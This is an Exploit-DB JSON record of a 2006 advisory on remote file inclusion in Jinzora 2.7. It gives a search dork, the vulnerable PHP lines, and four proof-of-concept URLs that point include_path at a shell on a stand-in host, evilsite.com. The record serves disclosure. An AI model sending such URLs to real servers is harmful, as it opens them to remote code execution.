{
  "id": "3003",
  "title": "Jinzora 2.7 - &#039;INCLUDE_PATH&#039; Multiple Remote File Inclusions",
  "cve": "CVE-2006-6770",
  "vuln_type": "unknown",
  "code": "+-------------------------------------------------------------------------------------------\r\n+ Jinzora <= 2.7 (include_path) Multiple Remote File Include Vulnerabilities\r\n+-------------------------------------------------------------------------------------------\r\n+ Vendor ............: http://www.jinzora.com/\r\n+ Affected Software .: Jinzora <= 2.7\r\n+ Download ..........: http://www.jinzora.com/downloads/j2.7.tar.gz\r\n+ Description .......: \"Jinzora enables you to stream your digital music and videos to any internet connected computer using a web browser\"\r\n+ Dork ..............: \"Jinzora Media Jukebox\"\r\n+ Class .............: Remote File Inclusion\r\n+ Risk ..............: High (Remote File Execution)\r\n+ Found By ..........: nuffsaid <nuffsaid[at]newbslove.us>\r\n+-------------------------------------------------------------------------------------------\r\n+ Details:\r\n+ Jinzora has several scripts which do not initialize variables before using them to include\r\n+ files, assuming register_globals = on, we can initialize any one of the variables in a query\r\n+ string and include a remote file of our choice.\r\n+\r\n+ Vulnerable Code:\r\n+ popup.php, line(s) 01-27:\r\n+ -> 01: <?php define('JZ_SECURE_ACCESS','true');\r\n+ -> 27: include_once('jzBackend.php'); //jzBackend.php is being included before the include_path var is set\r\n+ jzBackend.php, line(s) 40-77:\r\n+ -> 01: <?php if (!defined(JZ_SECURE_ACCESS)) die ('Security breach detected.');\r\n+ -> 40: @include($include_path.\"settings.php\"); //assumes the include_path var has been set\r\n+ -> 77: include($css);\r\n+ rss.php, line(s) 01-35:\r\n+ -> 01: <?php define('JZ_SECURE_ACCESS','true');\r\n+ -> 35: include_once('backend/backend.php');\r\n+ backend/backend.php, line(s) 02-42:\r\n+ -> 02: if (!defined(JZ_SECURE_ACCESS)) die ('Security breach detected.');\r\n+ -> 42: include_once($include_path. 'system.php'); //assumes the include_path var has been set\r\n+ ajax_request.php, line(s) 01-32:\r\n+ -> 01: <?php define('JZ_SECURE_ACCESS','true');\r\n+ -> 32: require_once('jzBackend.php'); //see jzBackend.php above for vulnerable code\r\n+ mediabroadcast.php, line(s) 01-42:\r\n+ -> 01: <?php define('JZ_SECURE_ACCESS','true');\r\n+ -> 42: include_once('backend/backend.php'); //see above for vulnerable code\r\n+\r\n+ Proof Of Concept:\r\n+ http://[target]/[path]/popup.php?include_path=http://evilsite.com/shell.php?\r\n+ http://[target]/[path]/rss.php?include_path=http://evilsite.com/shell.php?\r\n+ http://[target]/[path]/ajax_request.php?include_path=http://evilsite.com/shell.php?\r\n+ http://[target]/[path]/mediabroadcast.php?include_path=http://evilsite.com/shell.php?\r\n+-------------------------------------------------------------------------------------------\r\n\r\n# milw0rm.com [2006-12-25]",
  "url": "https://www.exploit-db.com/exploits/3003"
}